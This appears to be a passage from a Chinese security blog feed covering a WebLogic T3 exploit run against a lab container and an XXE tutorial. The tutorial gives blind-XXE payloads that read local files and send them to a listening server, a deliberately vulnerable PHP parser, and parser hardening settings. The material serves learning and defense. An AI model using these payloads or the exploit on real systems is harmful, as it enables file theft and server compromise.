class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(s.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                                + Character.digit(s.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;192.168.152.128&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7001</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Generate the payload</span></span><br><span class="line">            <span class="type">byte</span>[] payload = generatePayload();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// Exploit WebLogic server</span></span><br><span class="line">            T3Exploit(ip, port, payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯ä»¥è°ƒè¯•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225921150.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225921150.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125225921150"></p><p><code>docker images</code>æŸ¥çœ‹docker id</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215119331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215119331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125215119331"></p><p>ä¸å¯¹ï¼Œæˆ‘çœŸæ˜¯è„‘æ®‹å•Šæˆ‘ï¼Œ<code>docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨id</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215725487.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215725487.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125215725487"></p><p>è¿›å…¥å®¹å™¨ï¼š<code>docker exec -it 1985c4752c41 /bin/bash</code></p><p>å³å¯æŸ¥çœ‹æ˜¯å¦æ‰“æˆåŠŸ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125230040660.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125230040660.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125230040660"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">https://www.cnblogs.com/ph4nt0mer/p/11772709.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®ºjavaä¸­çš„XXE</title>
      <link href="/2024/11/06/java-xxe/"/>
      <url>/2024/11/06/java-xxe/</url>
      
        <content type="html"><![CDATA[<p>ç®€å•ä»‹ç»ä¸€ä¸‹XXE</p><h2 id="XXEç®€è¿°"><a href="#XXEç®€è¿°" class="headerlink" title="XXEç®€è¿°"></a>XXEç®€è¿°</h2><h3 id="å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“</h3><p>ä¸€èˆ¬æ˜¯ç”±ä¸€ä¸ªDTDæ§åˆ¶ä¸€ä¸ªXMLçš„æ ¼å¼ã€‚æ¯”å¦‚ï¼š</p><p>DOCTYPEå…ƒç´ åè·Ÿçš„ç¬¬ä¸€ä¸ªELEMENTå®šä¹‰äº†èƒ½æ¥æ”¶çš„æ ‡ç­¾é›†åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;]&gt;</span><br></pre></td></tr></table></figure><p>XMLå°±è¦æŒ‰ç…§DTDè¦æ±‚çš„å†™ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åŠ¨æ€çš„å®šä¹‰ä¸€ä¸ªæ ‡ç­¾ï¼Œè¿™æ ·å°±ä¸ç”¨é€ä¸ªå»æ”¹åŠ¨ä¸€ä¸ªç±»å‹çš„æ ‡ç­¾ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªDTD</p><p>å®šä¹‰äº†ä¸€ä¸ªæ ¹å…ƒç´ ä¸ºfooçš„xmlæ ‡ç­¾ï¼Œæ¥æ”¶ä»»ä½•ç±»å‹ï¼ˆANYï¼‰çš„æ ‡ç­¾ï¼Œå¦‚æœæ ‡ç­¾å†…å¼•ç”¨äº†<code>xxe</code>ï¼Œåˆ™æ›¿æ¢ä¸º<code>test</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨XMLä¸­ç”¨<code>&amp;å®ä½“å;</code>è¿›è¡Œè°ƒç”¨ï¼Œå¯ä»¥çœç•¥æ ¹å…ƒç´ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>äº‹å®ä¸Šï¼Œ<code>&lt;!ELEMENT foo ANY &gt;</code>è¿˜å¯ä»¥è¿›è¡Œçœç•¥ï¼Œå¹¶æŠŠDTDå’ŒXMLå†™åˆ°ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯å†…éƒ¨å®ä½“</p><p>å¤–éƒ¨å®ä½“å°±æ˜¯DTDé‡ŒåµŒå¥—è¯»å–å¤–éƒ¨çš„DTDï¼Œç”¨SYSTEMå…³é”®å­—å£°æ˜ã€‚è¿™é‡Œè¯»å–çš„æ–‡ä»¶å¯ä»¥æ˜¯ä»»ä½•æ ¼å¼çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å SYSTEM url &gt; //å¤–éƒ¨å®ä½“</span><br><span class="line">&lt;!ENTITY å®ä½“å å®ä½“çš„å€¼ &gt; //å†…éƒ¨å®ä½“</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h3><p>é™¤äº†ä¸Šé¢çš„<code>&amp;å®ä½“å;</code>å¼•ç”¨çš„å®ä½“ï¼Œè¿˜æœ‰<code>% å®ä½“å;</code>å¼•ç”¨çš„å‚æ•°å®ä½“ã€‚ï¼ˆç©ºæ ¼ä¸èƒ½çœç•¥ï¼‰</p><p>åŒºåˆ«åœ¨äºå‚æ•°å®ä½“çš„å¼•ç”¨æ˜¯å†™åœ¨DTDçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%remote-dtd;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œä½ å¯èƒ½è§‰å¾—å‚æ•°å®ä½“è¿™ä¸ªä¸œè¥¿å¾ˆå¤šä½™ï¼Œä½†æ˜¯åœ¨payloadçš„æ‹¼æ¥å¤„å‘æŒ¥äº†å·¨å¤§çš„ä½œç”¨</p><p>XMLè§£æå¼•ç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸æ¥æ”¶å¼•èµ·xmlæ ¼å¼æ··ä¹±çš„å­—ç¬¦ï¼ŒXMLä¸­çš„<code>&amp;&lt;&gt;,</code>ç­‰å‡éœ€è¦è½¬ä¹‰ï¼Œå¦åˆ™éœ€è¦åŠ ä¸Š<code>&lt;![CDATA[]]&gt;</code>å¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŒ…è£¹è½¬ä¹‰ã€‚</p><p>æŒ‰ç†è¯´ï¼Œ<code>&amp;å®ä½“å;</code>è¿›è¡ŒåŒ…è£¹çš„ä»£ç å¦‚ä¸‹ï¼Œå¯æ˜¯å®Œå…¨ä¸èƒ½è§£æã€‚ä¸èƒ½å…ˆè§£æå†æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY start SYSTEM &quot;&lt;![CDATA[&quot; &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">&lt;!ENTITY end SYSTEM &quot;]]&gt;&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&amp;start;&amp;xxe;&amp;end;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>% å®ä½“å;</code>å¯ä»¥å®ç°å…ˆæ‹¼æ¥åè§£æ</p><p>EvilDTDï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure><p>evil.dtdï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å®ç°äº†DTDä¹‹é—´çš„è”åŠ¨</p><h3 id="XXEç›²æ³¨"><a href="#XXEç›²æ³¨" class="headerlink" title="XXEç›²æ³¨"></a>XXEç›²æ³¨</h3><p>ä¸Šé¢çš„è¯»æ–‡ä»¶åˆ©ç”¨ï¼Œéœ€è¦æœ‰å›æ˜¾ã€‚é‚£æ— å›æ˜¾å‘¢ï¼Ÿ</p><p>SYSTEMå…³é”®å­—æ”¯æŒhttpåè®®ï¼Œæƒ³åŠæ³•åœ¨URLåæ‹¼æ¥å›æ˜¾ç»“æœï¼Œå½“ç„¶è¿˜æ˜¯ç”¨å‚æ•°å®ä½“</p><p>å…ˆå®šä¹‰ä¸€ä¸ªfileå®ä½“ï¼Œç”¨ä»¥è¯»å–æ–‡ä»¶ï¼›ç„¶åå®šä¹‰ä¸€ä¸ªåµŒå¥—çš„intå®ä½“ï¼ŒintåŒ…å«äº†sendå®ä½“ã€‚å…¶ä¸­<code>&amp;#37;</code>æ˜¯<code>%</code>çš„Unicodeç¼–ç ï¼Œå› ä¸º<code>%</code>ä¸å…è®¸å‡ºç°åœ¨Entityçš„valueä¸­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106142351840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106142351840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241106142351840"></p><p>æµ‹è¯•çš„æ¼æ´ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LIBXML_NOENT: å°† XML ä¸­çš„å®ä½“å¼•ç”¨ æ›¿æ¢ æˆå¯¹åº”çš„å€¼<br>LIBXML_DTDLOAD: åŠ è½½ DOCTYPE ä¸­çš„ DTD æ–‡ä»¶</p><h4 id="æ­£ç¡®çš„ç›²æ³¨"><a href="#æ­£ç¡®çš„ç›²æ³¨" class="headerlink" title="æ­£ç¡®çš„ç›²æ³¨"></a>æ­£ç¡®çš„ç›²æ³¨</h4><p>xxetest.dtdï¼Œå…¶ä¸­URLä¸ºå›æ˜¾vpsåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://172.18.240.1:8085/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POSTæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE payload [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:8888/xxetest.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;payload&gt;1&lt;/payload&gt;</span><br></pre></td></tr></table></figure><p>å°½ç®¡phpåœ¨æŠ¥é”™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151718676.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151718676.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241106151718676"></p><p>è¿˜æ˜¯æˆåŠŸå›æ˜¾äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151621941.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151621941.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241106151621941"></p><p>æ¥ä¸‹æ¥åˆ—ä¸€äº›å®éªŒä¸­é”™è¯¯çš„payloadï¼Œå¹¶è¯´æ˜åŸå› </p><h4 id="è¯•å›¾å°†xxetest-dtdç›´æ¥POSTè¿‡å»"><a href="#è¯•å›¾å°†xxetest-dtdç›´æ¥POSTè¿‡å»" class="headerlink" title="è¯•å›¾å°†xxetest.dtdç›´æ¥POSTè¿‡å»"></a>è¯•å›¾å°†xxetest.dtdç›´æ¥POSTè¿‡å»</h4><p>ç›´æ¥çœç•¥remoteå®ä½“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE payload [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://172.18.240.1:8085/?p=%file;&#x27;&gt;&quot;</span><br><span class="line">%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;payload&gt;1&lt;/payload&gt;</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š<code>PEReferences(Parameter-entity) forbidden in internal subset in Entity</code></p><p>ç¦æ­¢åœ¨å†…éƒ¨Entityä¸­å¼•ç”¨å‚æ•°å®ä½“</p><p>intæ²¡ç”¨SYSTEMå…³é”®å­—ï¼Œæ˜¯å‚æ•°å®ä½“çš„åŒæ—¶ä¹Ÿæ˜¯å†…éƒ¨å®ä½“ï¼Œç”¨<code>%int;%send;</code>å¼•ç”¨äº†å†…éƒ¨å®ä½“çš„å‚æ•°å®ä½“ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚ç”¨å¤–éƒ¨å®ä½“å»åŒ…å«ï¼Œå°±èƒ½æˆåŠŸåŠ è½½äº†</p><h4 id="è¯•å›¾çœç•¥intæ ‡ç­¾"><a href="#è¯•å›¾çœç•¥intæ ‡ç­¾" class="headerlink" title="è¯•å›¾çœç•¥intæ ‡ç­¾"></a>è¯•å›¾çœç•¥intæ ‡ç­¾</h4><p>çœç•¥intæ ‡ç­¾å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &#x27;http://172.18.240.1:8085/?p=%file;&#x27;&gt;</span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°%fileå¹¶æ²¡æœ‰è§£æ</p><p><a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></p><p>ç¬¬10é¡µæ˜ç¡®äº†ï¼ŒXMLè§£æå™¨ä¸ä¼šè§£æåŒçº§å‚æ•°å®ä½“çš„å†…å®¹ã€‚</p><p>ä½†æ˜¯å½“ä¸¤ä¸ªå‚æ•°ä¸æ˜¯åŒçº§ï¼Œç”¨å¦å¤–ä¸€ä¸ªæ ‡ç­¾å»åµŒå¥—åï¼Œå°±èƒ½ä½¿ç”¨å¦ä¸€ä¸ªå‚æ•°å®ä½“</p><h3 id="XXEå¼•ç”¨æœ¬åœ°DTD"><a href="#XXEå¼•ç”¨æœ¬åœ°DTD" class="headerlink" title="XXEå¼•ç”¨æœ¬åœ°DTD"></a>XXEå¼•ç”¨æœ¬åœ°DTD</h3><p>å¦‚æœç›®æ ‡æœºå™¨ä¸å…è®¸è¯·æ±‚å¤–ç½‘DTDå‘¢?</p><p>ubuntuç³»ç»Ÿè‡ªå¸¦&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtdï¼Œå…¶ä¸­å®šä¹‰äº†å¾ˆå¤šå‚æ•°å®ä½“å¹¶è°ƒç”¨äº†å®ƒã€‚å¦‚æœæˆ‘ä»¬é‡å†™ä¸€ä¸ªå‚æ•°å®ä½“ï¼ˆISOamsoï¼‰å¹¶å¼•ç”¨å®ƒï¼Œè¯¥å‚æ•°å®ä½“ä¾æ—§åœ¨å¤–éƒ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#x27;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>php filterä¼ªåè®®è¿˜æ”¯æŒhttpåè®®è¯»æ–‡ä»¶ï¼Œäºæ˜¯è¿˜èƒ½æ‰“ä¸ªå†…ç½‘æ¢æµ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=http:// + ip</span><br></pre></td></tr></table></figure><p>ä¸åŒè¯­è¨€æ”¯æŒçš„åè®®ä¸ä¸€æ ·</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106170129856.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106170129856.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241106170129856"></p><p>libxml2.9.1åŠä»¥åé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œjavaä¸­netdocç±»ä¼¼fileåè®®</p><h3 id="XXEçš„é˜²å¾¡"><a href="#XXEçš„é˜²å¾¡" class="headerlink" title="XXEçš„é˜²å¾¡"></a>XXEçš„é˜²å¾¡</h3><ul><li>php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><ul><li>java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h2 id="javaä¸­çš„XXE"><a href="#javaä¸­çš„XXE" class="headerlink" title="javaä¸­çš„XXE"></a>javaä¸­çš„XXE</h2><p>ä»¥ä¸‹å‡½æ•°æ”¯æŒè§£æå¤–éƒ¨å®ä½“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span 